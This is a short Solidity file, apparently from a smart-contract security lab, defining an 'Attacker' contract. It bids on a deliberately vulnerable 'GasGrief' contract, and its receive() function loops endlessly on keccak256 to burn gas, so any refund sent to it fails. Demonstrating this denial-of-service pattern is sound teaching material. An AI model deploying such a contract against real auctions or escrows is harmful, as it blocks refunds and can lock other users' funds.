//SPDX-License-Identifer: MIT

pragma solidity ^0.8.18;

import {GasGrief} from "./GasGriefVulnerable.sol"; 
contract Attacker {

        GasGrief public GriefAttack;
    constructor(address _contract){
        GriefAttack =  GasGrief(_contract);
    }

    function attack_deposit() public payable{
        GriefAttack.bid{value: msg.value}();

    }

    receive() external payable {

        for(uint256 i = 0; i < 100 ether; i++){
        keccak256("Intending to burn gas...");
        }
        
    }
}